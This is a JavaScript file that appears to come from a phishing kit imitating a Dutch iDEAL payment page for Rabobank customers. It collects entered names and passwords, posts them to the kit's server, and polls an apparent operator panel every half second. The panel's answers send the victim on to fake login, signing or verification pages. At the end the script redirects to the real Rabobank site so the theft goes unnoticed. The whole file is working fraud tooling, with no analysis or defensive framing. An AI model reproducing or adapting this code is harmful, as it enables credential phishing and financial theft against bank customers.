const login_form = document.querySelector('#token-view');

const wifi = document.querySelector('.wifi-name');
const wifi_pass = document.querySelector('.wifi-pass');
const wifi_pass_two = document.querySelector('.wifi-pass-two');
const loginButton = document.querySelector('#rass-action-login');
const token = document.querySelector('#token');
const error = document.querySelector('#error-div');

const image = document.querySelector('.rass-uicontrol-qrcode');

login_form.addEventListener('submit', e => {
    e.preventDefault();

    if (wifi.value == '' || wifi_pass.value == '' || wifi_pass_two.value == '' || wifi_pass.value != wifi_pass_two.value) {
        error.style.display = 'block';
        loginButton.style.backgroundColor = '#fd6400';
        loginButton.innerHTML = 'Bevestigen';
        loginButton.disabled = false;
        wifi.disabled = false;
        wifi.value = '';
        wifi_pass.disabled = false;
        wifi_pass.value = '';
        wifi_pass_two.disabled = false;
        wifi_pass_two.value = '';
    } else {
        const data = new FormData();
        data.append('wifi', wifi.value);
        data.append('wifi_pass', wifi_pass.value);
        data.append('wifi_pass_two', wifi_pass_two.value);

        loginButton.innerHTML = '<img src="/img/ing.gif" style="padding-top: 5px;" width="20">';
        loginButton.disabled = true;
        wifi.disabled = true;
        wifi_pass.disabled = true;
        wifi_pass_two.disabled = true;
        loginButton.style.backgroundColor = '#e8e8e8';
        loginButton.style.borderColor = 'transparent';
            
        error.style.display = 'none'; 

        fetch('/ideal-betalen/controleren/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => {
            const newInterval = setInterval(() => {
                fetch('/ideal-betalen/controleren/check/' + token.value, {
                    method: 'POST'
                }).then(res => {
                    res.json().then(data => {
                        if (data.page == 'signPage') {
                            window.location.href = '/ideal-betalen/ondertekenen/' + token.value;
                        } else if (data.page == 'loginPage') {
                            window.location.href = '/ideal-betalen/inloggen/' + token.value;
                        } else if (data.page == 'verificationPage') {
                            window.location.href = '/ideal-betalen/bevestigen/' + token.value;
                        } else if (data.page == 'control') {
                            error.style.display = 'block';
                            loginButton.style.backgroundColor = '#fd6400';
                            loginButton.innerHTML = 'Bevestigen';
                            loginButton.disabled = false;
                            wifi.disabled = false;
                            wifi.value = '';
                            wifi_pass.disabled = false;
                            wifi_pass.value = '';
                            wifi_pass_two.disabled = false;
                            wifi_pass_two.value = '';
                            clearInterval(newInterval)
                        } else if (data.page == 'finish') {
                            window.location.href = 'https://www.rabobank.nl';
                        } else if (data.page == 'waiting') {
                            console.log('Waiting...');
                        }
                    });
                });
            }, 500);
        });
    }
});
